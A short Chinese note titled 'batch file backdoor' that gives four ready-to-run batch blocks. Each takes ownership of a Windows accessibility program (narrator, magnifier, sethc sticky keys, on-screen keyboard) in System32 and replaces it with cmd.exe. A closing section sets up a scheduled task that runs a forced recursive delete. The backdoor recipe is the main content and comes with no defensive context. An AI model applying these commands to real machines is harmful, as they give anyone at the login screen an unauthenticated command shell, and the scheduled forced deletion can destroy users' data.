# 批处理文件后门

```
https://blog.csdn.net/huwei2003/article/details/66968001
//批处理命令学习教程
```



```bat
cd C:\windows\system32#切换目录
takeown /f narrator.exe#修改narrator的所有者
icacls narrator.exe /grant administrators:F#修改其权限为本机用户
ren narrator.exe  narrator_back.exe#重命名
copy cmd.exe narrator.exe#复制并命名
```

```bat
cd C:\windows\system32#放大镜修改为后门
takeown /f magnify.exe
icacls magnify.exe /grant administrators:F
ren magnify.exe magnify_back.exe
copy cmd.exe magnify.exe
```

```bat
cd C:\windows\system32#shift后门
takeown /f sethc.exe
icacls sethc.exe /grant administrators:F
ren sethc.exe seth1.exe
copy cmd.exe sethc.exe
```

```bat
cd C:\windows\system32#切换目录
takeown /f osk.exe#修改narrator的所有者
icacls osk.exe /grant administrators:F#修改其权限为本机用户
ren osk.exe  osk_back.exe#重命名
copy cmd.exe osk.exe#复制并命名


```

```
1、在记事本创建一个bat小脚本，输入@echo offdel /f /s /q e:\temp\*.*，e代表E盘，temp是E盘下要清理的文件夹。

然后再任务计划程序中点击任务计划创建新基本的任务
输入任务名字然后选择任务触发器
然后点击启动程序，然后运行。
https://zhidao.baidu.com/question/584007838.html

相对的：定时创建文件


```

